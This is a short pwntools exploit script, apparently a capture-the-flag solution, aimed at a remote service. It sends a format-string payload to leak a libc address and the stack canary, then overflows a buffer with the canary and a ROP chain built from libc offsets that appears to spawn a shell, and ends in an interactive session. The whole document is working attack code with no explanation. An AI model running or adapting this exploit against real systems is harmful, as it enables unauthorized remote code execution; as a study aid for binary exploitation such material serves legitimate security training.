from pwn import *

context(terminal = ["tmux","splitw","-h"], os="linux", arch ="amd64")
proc = remote("1.1.1.1", 2323)
libc = ELF("libc6_2.27-3ubuntu1.3_amd64.so")
proc.recv()
payload = b"%p "*39
proc.sendline(payload)
All = proc.recv()
Leak = eval(All[30:30+14].decode())
Canary = int(All[471:471+18].decode(), 16)
log.info("Leak: "+ hex(Leak))
log.info("Canary: "+ hex(Canary))
libc.address = Leak - libc.sym['_IO_2_1_stdin_']
log.info("Libc address: "+ hex(libc.address))
rop = p64(libc.address+0x8aa)+p64(libc.address + 0x215bf) +p64(libc.address + 0x1b3e1a) +p64(libc.address + 0x23eea)+p64(0)+p64(libc.address + 0x4f550)+p64(libc.address+0x8aa)
payload = b"X"*264+p64(Canary)+p64(0)+rop
proc.sendline(payload)
proc.interactive()
# If using different libc version
